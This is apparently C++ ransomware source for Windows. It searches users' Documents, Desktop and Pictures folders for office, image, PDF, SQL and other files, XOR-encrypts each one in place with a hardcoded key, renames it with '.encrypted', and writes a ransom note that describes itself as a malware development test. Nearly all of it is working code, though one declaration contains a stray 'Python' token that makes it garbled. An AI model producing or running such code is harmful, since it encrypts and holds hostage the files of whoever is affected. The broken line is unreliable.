#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <wincrypt.h>
#include <shlobj.h>
#include <thread>
#include <chrono>

#pragma comment(lib, "crypt32.lib")

std::vector<std::string> targetExtensions = {
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".pdf", ".txt", ".jpg", ".jpeg", ".png", ".sql",
    ".html", ".htm", ".xml", ".csv"
};

std::string encryptionKey = "test-key-12345";

void findFiles(const std::string& path, std::vector<std::string>& files) {
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA((path + "\\*").c_str(), &findFileData);
    
    if (hFind == INVALID_HANDLE_VALUE) return;
    
    do {
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(findFileData.cFileName, ".") != 0 && 
                strcmp(findFileData.cFileName, "..") != 0) {
                findFiles(path + "\\" + findFileData.cFileName, files);
            }
        } else {
            std::string fileName = findFileData.cFileName;
            std::string fullPath = path + "\\" + fileName;
            
            for (const auto& ext : targetExtensions) {
                if (fileName.length() >= ext.length() &&
                    fileName.compare(fileName.length() - ext.length(), ext.length(), ext) == 0) {
                    files.push_back(fullPath);
                    break;
                }
            }
        }
    } while (FindNextFileA(hFind, &findFileData) != 0);
    
    FindClose(hFind);
}

bool simpleXorEncrypt(const std::string& filePath) {
    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile) return false;
    
    std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)),
                           std::istreambuf_iterator<char>());
    inFile.close();
    
    if (buffer.empty()) return false;
    
    for (size_t i = 0; i < buffer.size(); ++i) {
        buffer[i] ^= encryptionKey[i % encryptionKey.size()];
    }
    
    std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
    if (!outFile) return false;
    
    outFile.write(buffer.data(), buffer.size());
    outFile.close();
    
    std::string newName = filePath + ".encrypted";
    rename(filePath.c_str(), newName.c_str());
    
    return true;
}

void createRansomNote() {
    std::string notePath = "C:\\Users\\Public\\Documents\\READ_ME.txt";
    std::ofstream note(notePath);
    note << "Your files have been encrypted.\n";
    note << "This is a test conducted as part of Malware development.\n";
    note << "All files will be restored from backup after data collection is complete.\n";
    note.close();
}

int main() {
    std::vector Python<std::string> documentsPaths = {
        "C:\\Users\\Test\\Documents",
        "C:\\Users\\Test\\Desktop",
        "C:\\Users\\Test\\Pictures"
    };
    
    std::vector<std::string> targetFiles;
    
    for (const auto& path : documentsPaths) {
        findFiles(path, targetFiles);
    }
    
    int encryptedCount = 0;
    for (const auto& file : targetFiles) {
        if (simpleXorEncrypt(file)) {
            encryptedCount++;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
    
    createRansomNote();
    
    return 0;
}